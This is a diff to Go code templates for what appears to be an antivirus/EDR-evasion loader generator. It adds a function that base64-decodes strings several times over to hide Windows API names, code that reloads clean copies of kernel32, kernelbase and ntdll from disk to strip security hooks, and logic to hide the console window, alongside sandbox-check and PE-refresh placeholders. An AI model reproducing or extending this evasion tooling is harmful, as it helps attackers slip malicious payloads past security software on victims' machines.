@@ -1036,6 +1036,18 @@ func {{.Variables.EnumProcessModules}}({{.Variables.process}} windows.Handle, {{
 	return {{.Variables.n}}, nil
 }
 
+func {{.Variables.decode}}({{.Variables.b64}} string,) string {
+	var {{.Variables.decoded}} []byte
+		{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString({{.Variables.b64}})
+	{{.Variables.sum}} := 1
+	for i := 1; i < {{.Variables.number}}; i++ {
+		{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString(string({{.Variables.decoded}}))
+		{{.Variables.sum}} += i
+	}
+	return string({{.Variables.decoded}})
+
+}
+
 
 {{.Variables.Sandboxfunction}}
 
@@ -1064,7 +1076,7 @@ func {{.Variables.loader}}()  {
 	err := {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}))
 	if err != nil {
 	}
-	err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'r', '.', 'd', 'l', 'l'}))
+	err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'e', '.', 'd', 'l', 'l'}))
 	if err != nil {
 	}
 	err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}))
@@ -1380,6 +1392,17 @@ func {{.Variables.EnumProcessModules}}({{.Variables.process}} windows.Handle, {{
 	return {{.Variables.n}}, nil
 }
 
+func {{.Variables.decode}}({{.Variables.b64}} string,) string {
+	var {{.Variables.decoded}} []byte
+		{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString({{.Variables.b64}})
+	{{.Variables.sum}} := 1
+	for i := 1; i < {{.Variables.number}}; i++ {
+		{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString(string({{.Variables.decoded}}))
+		{{.Variables.sum}} += i
+	}
+	return string({{.Variables.decoded}})
+
+}
 
 {{.Variables.Sandboxfunction}}
 
@@ -1388,8 +1411,16 @@ func {{.Variables.Console}}(show bool) {
 	{{.Variables.getWin}} := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc({{.Variables.decode}}("{{.Variables.GetConsoleWindowName}}"))
 	{{.Variables.showWin}} := syscall.NewLazyDLL(string([]byte{'u', 's', 'e', 'r', '3', '2',})).NewProc({{.Variables.decode}}("{{.Variables.ShowWindowName}}"))
 	{{.Variables.hwnd}}, _, _ := {{.Variables.getWin}}.Call()
+	if {{.Variables.hwnd}} == 0 {
+		return
+	}
+	if show {
+	var {{.Variables.SW_RESTORE}} uintptr = 9
+	{{.Variables.showWin}}.Call({{.Variables.hwnd}}, {{.Variables.SW_RESTORE}})
+	} else {
 	var {{.Variables.SW_HIDE}} uintptr = 0
 	{{.Variables.showWin}}.Call({{.Variables.hwnd}}, {{.Variables.SW_HIDE}})
+	}
 }
 
 func {{.Variables.Versionfunc}}() string {
@@ -1419,7 +1450,7 @@ func {{.Variables.loader}}()  {
 	if err != nil {
 		{{.Variables.RefreshPE}}
 	}
-	err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'r', '.', 'd', 'l', 'l'}))
+	err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'e', '.', 'd', 'l', 'l'}))
 	if err != nil {
 		{{.Variables.RefreshPE}}
 	}
